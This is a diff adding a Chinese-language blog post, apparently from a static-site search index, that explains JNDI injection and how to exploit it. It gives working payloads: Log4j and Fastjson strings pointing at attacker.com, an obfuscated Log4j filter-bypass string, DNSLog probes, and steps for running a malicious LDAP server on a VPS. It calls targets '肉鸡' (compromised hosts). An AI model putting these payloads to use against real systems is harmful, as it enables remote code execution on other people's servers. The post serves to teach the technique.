@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>JNDI</title>
+    <link href="/2026/03/24/JNDI/"/>
+    <url>/2026/03/24/JNDI/</url>
+    
+    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>漏洞：攻击者让恶意的 JNDI 服务（RMI 或 LDAP）返回一个带有 javaCodeBase 属性的 Reference（引用）对象</p><ul><li><p><strong>Reference (引用对象)</strong>：你可以把它理解为一张“<strong>提货单</strong>”。当肉鸡访问你的 LDAP 服务时，你的服务不会直接给它一个 Java 对象，而是给它这张提货单。</p></li><li><p>提货单上的内容</p><ol><li><strong>ClassName</strong>: “我要找的东西叫 <code>Exploit</code>”。</li><li><strong>Factory</strong>: “这个东西由 <code>ExploitFactory</code> 这个工厂类负责生产”。</li><li><strong>javaCodeBase</strong>: “如果你本地找不到这个工厂类，去 <code>http://attacker.com/</code> 这个地址下载”。</li></ol></li></ul><h2 id="命令执行原理"><a href="#命令执行原理" class="headerlink" title="命令执行原理"></a>命令执行原理</h2><p>早期java允许远程连接外部库，就可以直接在LDAP这种服务器里面写恶意文件，让肉鸡执行</p><p>后期java修复后，衍生出两种绕过方法<br> \1. “找本地危险类” (利用 Local ObjectFactory)：<br> 攻击者返回一个 <code>Reference</code>，但把 <code>javaCodeBase</code> 设为 <code>null</code>（因为高版本 JDK 禁止远程下载），然后把 <strong>Factory</strong> 指定为肉鸡本地自带的某个类（如 Tomcat 的 <code>BeanFactory</code>）。但基本上我们不知道肉鸡有什么类，攻击手段单一且局限<br> \2. “利用本地反序列化漏洞” (LDAP 返回 Serialized Data)<br> 这是 LDAP 协议的高级玩法。攻击者不返回“提货单”了，而是直接返回一串<strong>二进制数据</strong>（即 <code>javaSerializedData</code>）。<br> <strong>原理</strong>：LDAP 协议允许直接存储 Java 序列化后的对象。当肉鸡通过 JNDI 获取到这串数据时，Java 底层会自动触发 <code>readObject()</code> 进行反序列化。<br> 随后攻击者通过构造一整条复杂的通用库的通用函数（<code>CC链</code>），最终还是导向<code>Runtime.exec</code></p><h2 id="注入手段"><a href="#注入手段" class="headerlink" title="注入手段"></a>注入手段</h2><p>JNDI的核心注入点通常是一个接受字符串并传入<code>lookup()</code>的参数</p><h3 id="注入位置-形式"><a href="#注入位置-形式" class="headerlink" title="注入位置&#x2F;形式"></a>注入位置&#x2F;形式</h3><p>其他技术栈文章中记载的，</p><ul><li><strong>Log4j 场景</strong>：<code>${jndi:ldap://attacker.com/Exploit}</code></li><li><strong>Fastjson 场景</strong>：<code>{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://attacker.com/Exploit&quot;,&quot;autoCommit&quot;:true}</code></li><li><strong>原生 JNDI 场景</strong>：<code>context.lookup(request.getParameter(&quot;name&quot;))</code></li></ul><p>最常见的就是 Web 参数、Header 或日志内容。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 假设这是某个 Web 应用的代码</span><br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;id&quot;</span>);<br><span class="hljs-type">Context</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>ctx.lookup(name); <span class="hljs-comment">// 这里就是注入点！</span><br></code></pre></td></tr></table></figure><p>攻击者直接传参：<code>?id=ldap://attacker.com/Exploit</code></p><p> 或者Log4j的框架下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 开发者只是想记录一个错误 </span><br>logger.error(<span class="hljs-string">&quot;User not found: &quot;</span> + userName);<br></code></pre></td></tr></table></figure><p>攻击者把自己的用户名设为 <code>${jndi:ldap://attacker.com/Exploit}</code>      Log4j框架自动调用JNDI</p><h3 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h3><p>这里以主流的LDAP为例</p><ol><li><strong>注入点：</strong> 首先你找到了可能处理你输入并传入lookup的点，例如某个传json的POST请求</li><li><strong>开恶意服务：</strong> 用<code>JNDIExploit</code>等恶意工具在公网VPS启动LDAP恶意服务端</li><li><strong>注入payload：</strong> 向目标发送 <code>ldap://你的VPS:1389/Exploit</code></li><li><strong>中毒：</strong> 肉鸡解析里面的字符串，直接执行或被CC链攻击</li></ol><p>怎么获取注入点？</p><p>只有盲测和OOB外带</p><p>例如Log4j，它是日志记录工具，他会记录一切看起来有用的信息<br> 包括 Header，参数。直接拿jndi套上去就行<br> 例子：<code>X-Forwarded-For: ${jndi:ldap://你的专属前缀.dnslog.cn/a}</code><br> 绕过一把测：<code>${${lower:${lower:j}}nd${env:AAA:-i}:${lower:l}${lower:d}a${::-p}://attacker.com/a}</code></p><p>例如fastjson，它只处理前后端交互的json数据<br> 看到json顺手测一下<br> <strong>方法 A：报错回显探测</strong><br> 故意发一个格式损坏的 JSON，或者传入一个它无法解析的类型： <code>{&quot;@type&quot;:&quot;java.lang.xxx&quot;}</code><br> 如果服务器配置不当，返回了 500 错误，并且在报错信息（Stack Trace）里包含 <code>com.alibaba.fastjson...</code> 的字眼，直接确认目标使用了 Fastjson。</p><p><strong>方法 B：DNSLog 盲打（最稳妥）</strong><br> 利用 Java 自带的 <code>java.net.URL</code> 或 <code>java.net.Inet4Address</code> 类，这两个类在被实例化时，会默认发起一次 DNS 解析。<br> 你把发往后端的 JSON 改成这样：<br> <code>{&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;你的专属前缀.dnslog.cn&quot;}</code><br> 同样，如果 DNSLog 平台收到了请求，说明 Fastjson 反序列化成功执行了。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>技术栈漏洞</category>
+      
+    </categories>
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Nacos</title>
     <link href="/2026/03/19/Nacos/"/>
     <url>/2026/03/19/Nacos/</url>
